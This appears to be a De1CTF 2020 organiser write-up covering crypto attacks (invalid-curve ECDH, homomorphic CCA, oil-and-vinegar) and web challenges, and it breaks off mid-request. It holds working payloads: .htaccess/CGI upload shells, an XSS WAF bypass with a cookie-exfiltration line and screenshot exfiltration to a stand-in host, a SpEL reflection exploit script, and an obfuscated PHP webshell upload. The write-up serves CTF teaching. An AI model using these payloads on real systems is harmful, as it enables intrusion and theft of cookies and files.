<p>In this task we can see a <a href="%5Bhttps://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman%5D(https://en.wikipedia.org/wiki/Elliptic-curve_Diffie–Hellman)">ECDH</a> system. We can exchange keys and encrypt message to get result. So we can get the exchanged keys by encrypting our message. Also there is a backdoor, if you give server the secret, the server will give you flag.</p>
<p>But the task doesn't check whether the given point is on curve. So we can us <a href="https://web-in-security.blogspot.com/2015/09/practical-invalid-curve-attacks.html" target="_blank" rel="noopener">Invalid curve attack</a> to get secret.</p>
<p>We can construct points not on the given curve with low order by using open source software such as <a href="https://github.com/J08nY/ecgen" target="_blank" rel="noopener">ecgen</a> or <a href="https://crypto.stackexchange.com/questions/71065/invalid-curve-attack-finding-low-order-points" target="_blank" rel="noopener">Invalid curve attack algorithm</a> and use CRT to get secret. Then we can use the generated data to attack the task and get flag.</p>
<p>PS: use <em>genData.py</em> to generated <em>data.txt</em> locally and use <span class="math inline">\(exp.py\)</span> to attack this chanllenge.</p>
<p>Reference:</p>
<p><a href="https://en.wikipedia.org/wiki/Elliptic-curve_Diffie–Hellman" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman</a></p>
<p>https://crypto.stackexchange.com/questions/71065/invalid-curve-attack-finding-low-order-points</p>
<p>https://web-in-security.blogspot.com/2015/09/practical-invalid-curve-attacks.html</p>
<p>https://www.iacr.org/archive/pkc2003/25670211/25670211.pdf</p>
<p>https://github.com/J08nY/ecgen</p>
<h2><span id="homomorphic">Homomorphic</span></h2>
<p>This is a homomorphic encryption crypto system. We can use CCA to leak secret key and attack it.</p>
<p>Here is the solution:</p>
<ol type="1">
<li><p>Let : <span class="math inline">\(M = \delta/4 + 20\)</span> , where 20 is a number large enough to cover up the noise.</p></li>
<li><p>Let: <span class="math inline">\(t_1 = Mx^i,t2 = M\)</span></p></li>
<li><p>Let ciphertext: <span class="math inline">\(c_0 = pk[0] + t_1,c1 = pk[1]+t_2\)</span></p></li>
<li><p>Send <span class="math inline">\(c = (c0,c1)\)</span> to server</p></li>
<li><p>The server will do this: <span class="math inline">\(c_0+c_1s = pk[0]+t_1+(pk[1]+t_2)s = -(as+e)+t_1+(a+t_2)s=e+t_1+t_2s\)</span></p>
<p>so the decryption result is all 0 except for the i-th bit, and the i-th bit is equal to the i-th bit of secret key <span class="math inline">\(s\)</span></p></li>
<li><p>Append the i-th bit of secret key <span class="math inline">\(s\)</span> to result array and back to step 1 until recover all the bits of secret key <span class="math inline">\(s\)</span></p></li>
<li><p>Use the secret key to decrypt flag</p></li>
</ol>
<p>Also because the task has a decrypt function with bad check function. We can use many other ways to decrypt flag too. Such as add a <span class="math inline">\(q\)</span> to the items of input <span class="math inline">\(c0\)</span> and <span class="math inline">\(c1\)</span>, add other small numbers or etc.</p>
<p>Reference:</p>
<p>https://arxiv.org/pdf/1906.07127.pdf</p>
<p>https://www.slideshare.net/ssuserbd9135/danger-of-using-fully-homomorphic-encryption-a-look-at-microsoft-seal-cansecwest2019</p>
<p>https://github.com/edwardz246003/danger-of-using-homomorphic-encryption</p>
<h2><span id="mini-purε-plus">Mini Purε Plus</span></h2>
<p><a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/crypto/Mini%20#Purε" target="_blank" rel="noopener">Mini Purε</a> is the crypto challenge of De1CTF 2019, this year I try to add the <em>ROUND</em> and give you data to attack.</p>
<p>Here is the solution:</p>
<p>Assume the input is <span class="math inline">\((C,x)\)</span> , the output is <span class="math inline">\((C_L,C_R)\)</span>, then we can easily get the coefficients of <span class="math inline">\(x^{3^{m-1}-1}\)</span> and <span class="math inline">\(x^{3^{m-1}-3}\)</span> in <span class="math inline">\(C_R\)</span> is <span class="math inline">\(k0\)</span> and <span class="math inline">\({k0}^3 + k1 + C\)</span> , where <span class="math inline">\(C\)</span> is a constant，<span class="math inline">\(x\)</span> is a variable and <span class="math inline">\(k0,k1\)</span> are the first and second round keys.</p>
<p>So we can use <a href="https://en.wikipedia.org/wiki/Integral_cryptanalysis" target="_blank" rel="noopener">Square attack</a> to find this: <span class="math display">\[
\sum_{x\in F_{2^n}}x^{2^{n} - 3^{m-1}}C_R(x) = k0
\]</span></p>
<p><span class="math display">\[
\sum_{x\in F_{2^n}}x^{2^{n} - 3^{m-1}-2}C_R(x) = k0^3 + k1 + C
\]</span></p>
<p>where <span class="math inline">\(n=24,m=16\)</span></p>
<p>Then we can get <span class="math inline">\(k0,k1\)</span> and get all keys to decrypt flag.</p>
<p>And thanks to <a href="https://redbud.info/ctfteam.html" target="_blank" rel="noopener">Redbud</a>, they provided an improved interpolation attack method. It also works.</p>
<p>Reference:</p>
<p>https://en.wikipedia.org/wiki/Integral_cryptanalysis</p>
<p>https://link.springer.com/content/pdf/10.1007%2F978-3-642-03317-9_11.pdf</p>
<h2><span id="ov">OV</span></h2>
<p>This is a balanced oil and vinegar scheme. And it has been attacked by <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9564&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener">Kipnis and Shamir in 1998</a>.</p>
<p>So we can just use Kipnis-Shamir attack to solve this task.</p>
<p>However I made some mistakes in the <em>hashFunction</em>. It should be like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = [K.fetch_int(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br></pre></td></tr></table></figure>
<p>But I write it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br></pre></td></tr></table></figure>
<p>So there is a unexpected solution: just send <em>Iwanttoknowflag!</em> to sign and send the signed data to get flag.</p>
<p>And thanks to <a href="https://github.com/samueltangz" target="_blank" rel="noopener">Mystiz</a> , he helped me to find out the unexpected solution and improve my solution scripts.</p>
<p>Also thanks to <a href="https://github.com/hellman" target="_blank" rel="noopener">Hellman</a>, he reminded me of this mistake too.</p>
<p>Here is the excepted solution:</p>
<p>We assume public key is <span class="math inline">\(P: k^n \rightarrow k^o\)</span> , where <span class="math inline">\(o = v = 16,n = o+v\)</span></p>
<ol type="1">
<li>Produce the corresponding symmetric matrices for the homogeneous quadratic parts of public key's polynomials: <span class="math inline">\(W_1,W_2,...,W_o\)</span>. Randomly choose two linear combination of <span class="math inline">\(W_1,W_2,...,W_o\)</span> and still denote them as <span class="math inline">\(W_1\)</span> and <span class="math inline">\(W_2\)</span> in which <span class="math inline">\(W_1,W_2\)</span> is invertible. Calculate <span class="math inline">\(W_{12} = W_1 * W^{-1}_2\)</span>.</li>
<li>Compute the characteristic polynomial of <span class="math inline">\(W_{12}\)</span> and find its linear factor of multiplicity 1. Denote such factor as <span class="math inline">\(h(x)\)</span>. Compute <span class="math inline">\(h(W_{12})\)</span> and its corresponding kernel.</li>
<li>For each vector <span class="math inline">\(O\)</span> in the kernel of step 2, use <span class="math inline">\(OW_iO=0\)</span>, <span class="math inline">\((1 \leq i \leq o)\)</span> to test if <span class="math inline">\(O\)</span> belongs to the hidden oil space. Choose linear dependent vectors among them and append them to set <span class="math inline">\(T\)</span>.</li>
<li>If <span class="math inline">\(T\)</span> contains only one vector or nothing, go back to step 1.</li>
<li>If necessary, find more vectors in <span class="math inline">\(T:O_3,O_4,...\)</span> Calculate <span class="math inline">\(K_{O_1} \bigcap ... \bigcap K_{O_t}\)</span> to find out the hidden Oil space in which <span class="math inline">\(K_{O_t}\)</span> is a space from which the vectors <span class="math inline">\(x\)</span> satisfy that <span class="math inline">\(O_tW_ix=0\)</span>, <span class="math inline">\((1 \leq i \leq o)\)</span>.</li>
<li>Extract a basis of hidden Oil space and extend it to a basis of <span class="math inline">\(k^n\)</span> and use it to transform the public key polynomials to basic Oil-Vinegar polynomials form.</li>
</ol>
<p>This write up doesn't write the whole content of Kipnis-Shamir attack, if you are interesting in it, you can see the papers in reference. Thanks.</p>
<p>PS: I have fixed these mistakes including word spelling mistake and generated the new source code. You can try to solve this task.</p>
<p>Reference:</p>
<p>http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9564&amp;rep=rep1&amp;type=pdf</p>
<p>https://link.springer.com/content/pdf/10.1007%2F978-3-642-03317-9_11.pdf</p>
<p>https://link.springer.com/chapter/10.1007/978-3-319-38898-4_4</p>
<p>https://github.com/dsm501/Multivariate-cryptography-/blob/master/UOV%20Scheme.sagews</p>
<h2><span id="mc_noisemap">mc_noisemap</span></h2>
<p>Files: <a href="https://pastebin.com/P6YuDdBF" target="_blank" rel="noopener">exp.js</a> <a href="https://pastebin.com/gqwxugFC" target="_blank" rel="noopener">package.json</a> <a href="https://pastebin.com/vngikVFN" target="_blank" rel="noopener">www/map.html</a> <a href="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js" target="_blank" rel="noopener">www/assets/jquery.min.js</a> <a href="https://pastebin.com/EDna6NcL" target="_blank" rel="noopener">www/assets/noisemap.js</a> <a href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/0.9.0/addons/p5.dom.js" target="_blank" rel="noopener">www/assets/p5.dom.js</a> <a href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/0.9.0/p5.js" target="_blank" rel="noopener">www/assets/p5.js</a></p>
<p>The challenge is about <code>Image Identification</code>, modified basing on <a href="https://github.com/erdavids/Hex-Map" target="_blank" rel="noopener">erdavids/Hex-Map</a>.</p>
<p>My solution is not perfect. Perhaps there are some good ways to solve the challenge, I believe.</p>
<p>Just have a check on the exploit file <code>exp.js</code>.</p>
<p><code>De1CTF{MCerrr_L0v3_P3r1iN_N0IsE-M4p?}</code></p>
<h1><span id="web">web</span></h1>
<h2><span id="check-in">check in</span></h2>
<p><strong>Points of this Challenge</strong>： 1. Usage of <code>.htaccess</code> 2. The usage of CGI in Linux You need to pay attention to while uploading: - <code>content-type</code>Field verification - Suffix blacklist verification(<code>/ph|ml|js|cg/</code>) - Document content verification <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/perl|pyth|ph|auto|curl|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/</span><br></pre></td></tr></table></figure></p>
<p><strong>Intended solution</strong></p>
<p>.htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure></p>
<p>1.xx: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure></p>
<p>After uploading the file, we found that the status code was 500 and we could not parse the bash file, because our target site was a Linux environment. If we wrote it with the local editor and the encoding format was not consistent with that when uploading, we could not parse it, so we could write it in the Linux environment, export and upload it.</p>
<p><strong>Unintended solution 1</strong></p>
<p>.htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .xx</span><br></pre></td></tr></table></figure></p>
<p>1.xx <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="string">'cat /flag'</span>;</span><br></pre></td></tr></table></figure></p>
<p><strong>Unintended solution 2</strong></p>
<p>Use server status information</p>
<p>.htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure></p>
<p>Upload files and access your own upload directory,You can see the server status information,This method can at any time look at the information of a file that someone else has access to, and use someone else's file to successfully getflag.</p>
<h2><span id="animal-crossing">Animal crossing</span></h2>
<p>Description: Free passport creator lets you show your island!</p>
<h3><span id="level-1-bypass-the-cloud-waf">Level 1: bypass the cloud WAF</span></h3>
<p>Cloud WAF usually has several layers and several filtering methods. Here I also designed two layers of protection.</p>
<h4><span id="layer-1-blacklist-detection">Layer 1: Blacklist detection</span></h4>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="comment">//global</span></span><br><span class="line">    <span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</span><br><span class="line">    <span class="comment">//func</span></span><br><span class="line">    <span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</span><br><span class="line">    <span class="comment">//char</span></span><br><span class="line">    <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</span><br><span class="line">    <span class="comment">//key</span></span><br><span class="line">    <span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</span><br><span class="line">    <span class="comment">//string</span></span><br><span class="line">    <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The way to bypass the blacklist is to avoid the strings and characters of ban. Here, because of the iris framework problem of go, the <code>;</code> and the data after it will be deleted, and can be bypassed with <code>%0a</code></p>
<h4><span id="layer-2-static-syntax-analysis">Layer 2: Static syntax analysis</span></h4>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Pass in data to fmt.Sprintf(&quot;&apos;%s&apos;;&quot;, data), and then parse the syntax. If parse fails, the error will be returned directly.</span><br><span class="line">2. And then we visit AST nodes:</span><br><span class="line">   1. VariableExpression/AssignExpression, All declaration/assignment statements will ban</span><br><span class="line">   2. CallExpression, all function call, and callee not Identifier, will ban, example:</span><br><span class="line">      1. ban:  test.test()、a[x]()</span><br><span class="line">      2. pass: test()</span><br><span class="line">   3. BracketExpression, all member reference and member is not Identifier, will ban, example:</span><br><span class="line">      1. ban:  a[1]、a[&apos;xx&apos;]</span><br><span class="line">      2. pass: a[x]</span><br></pre></td></tr></table></figure>
<p>This layer of WAF, in fact, only needs to find out the rule of ban and find the unprocessed syntax to bypass it. My expected solution here is to pass variables with <code>throw</code>, but there are many other syntax that can be used.</p>
<p>The payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=base64DATAXXXXXXX<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></span><br></pre></td></tr></table></figure>
<p>After bypassing the two layers of WAF protection, the local successful alert, we can use:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</span><br></pre></td></tr></table></figure>
<p>get the admin cookie, and the cookie is a part of the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure>
<h3><span id="level-2-read-400-pictures">Level 2: read 400 pictures</span></h3>
<p>In the other half of the flag, hint:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the admin doing?</span><br></pre></td></tr></table></figure>
<p>Read the administrator's document, you will find that there are 400 PNG images, and the flag is hidden in these images.</p>
<p>Here are several solutions preset during the design:</p>
<ol type="1">
<li>Bypass CSP to import html2canvas lib, get the screenshot and upload to server, get the image address and send it back, then download the image</li>
<li>Use the for loop to send all 400 pictures to /upload, get 400 picture addresses and send back</li>
<li>Read the pictures directly and send them back one by one, write scripts, or use for to circulate and batch transfer, but the return process needs code conversion, and after the transfer back, it also needs to be converted into pictures for splicing</li>
</ol>
<p>All three solutions can get the flag, I will introduce the solution of bypassing CSP and import html2canvas lib. Other methods are similar, so I won't write them all (You can go to see the players' writeup),</p>
<h4><span id="bypass-csp-to-import-html2canvas-lib">Bypass CSP to import html2canvas lib</span></h4>
<p>The main function of this website is to create a animal crossing passport, The homepage has a <code>/upload</code> api for upload image, you can upload a file with <code>png</code> suffix, and use <code>fetch</code> get the png file source, then <code>eval</code> it. You can bypass CSP to import the html2canvas lib and execute it.</p>
<p>The png file:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line">html2canvas.js code</span><br><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// screenshot-&gt;upload screenshot-&gt;send img address back</span></span><br><span class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</span><br><span class="line">        url = <span class="string">"/upload"</span>,</span><br><span class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</span><br><span class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</span><br><span class="line">        form.append(<span class="string">"file"</span>, file)</span><br><span class="line">        fetch(url, &#123;</span><br><span class="line">            method: <span class="string">"POST"</span>,</span><br><span class="line">            body: form</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
<p>Here I also write the JS of screenshot operation into png.</p>
<p>It upload the screenshot to the server and get the returned image address, then send it back to the attacker</p>
<h4><span id="read-image-and-execute">Read image and execute</span></h4>
<p>After upload the image, get the png address, then you can read the image with the controllable JS part and execute it</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</span><br></pre></td></tr></table></figure>
<p>And you can use the method of bypassing the WAF to pack it</p>
<p>Finally, when submitted to the BOT, you can receive the address of the screenshot of the admin's interface, and download it to see the other half of the flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<p>Flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="calc">calc</span></h2>
<h3><span id="1-challenge-info">1. challenge info</span></h3>
<p>Please calculate the content of file /flag http://106.52.164.141</p>
<h3><span id="2-design-document">2. design document</span></h3>
<p>I found there are many difference between spel's grammar and java's grammar. For example, in spel we can use 1.class to get the class java.lang.Integer, but in java, we cannot.</p>
<p>I want to design a challenge to let ctfers discovery these difference and construct a more complicated reflection chain instead of the copy the payload from the internet directly.</p>
<p>So, i use two technology to forbide normal payloads.</p>
<ol type="1">
<li>blacklist filter:
<ul>
<li>T(</li>
<li>#</li>
<li>new</li>
<li>java.lang</li>
<li>Runtime</li>
<li>exec.*(</li>
<li>getRuntime</li>
<li>ProcessBuilder</li>
<li>start</li>
<li>getClass</li>
<li>String</li>
</ul></li>
<li>rasp</li>
</ol>
<p>There may be 3 different way to solve: 1. bypass blacklist filter to use T or # or new keywords 2. bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag 3. close the rasp protection</p>
<h3><span id="3-exp">3. exp</span></h3>
<p>which scheme we want players to use is the scheme2:bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag. and i just give my exploit here. of course you can try other two schemes to solve this challenge (actually they are really feasible.)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import commands</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_flag(target):</span><br><span class="line">    payload = &apos;1.class.forName(&quot;java.nio.file.Files&quot;).getMethod(&quot;readAllLines&quot;, 1.class.forName(&quot;java.nio.file.Path&quot;)).invoke(null, 1.class.forName(&quot;java.nio.file.Paths&quot;).getMethod(&quot;get&quot;, 1.class.forName(&quot;java.net.URI&quot;)).invoke(null, 1.class.forName(&quot;java.net.URI&quot;).getMethod(&quot;create&quot;, 1.class.forName(&quot;java.la&quot;+&quot;ng.Str&quot;+&quot;ing&quot;)).invoke(null, &quot;file:///flag&quot;)))&apos;</span><br><span class="line">    print(&quot;payload&quot;, payload)</span><br><span class="line">    url = &quot;http://&#123;&#125;/spel/calc&quot;.format(target)</span><br><span class="line">    r = requests.get(url, params=&#123;&quot;calc&quot;: payload&#125;)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    get_flag(&quot;106.52.164.141&quot;)</span><br></pre></td></tr></table></figure>
<h3><span id="4-other-writeups">4. other writeups</span></h3>
<p>I am ashamed that there are more detailed writeups written by players. you can find here: https://ctftime.org/task/11491</p>
<h2><span id="hard_pentest">Hard_Pentest</span></h2>
<p>easy bypass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 47.113.219.76</span><br><span class="line">Content-Length: 1918</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://47.113.219.76</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://47.113.219.76/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php::$DATA&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&apos;!&apos;==&apos;@&apos;]?&gt;&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___ =$__?&gt;</span><br><span class="line">&lt;?=$____=$___?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__.$___?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$____=&apos;_&apos;?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span 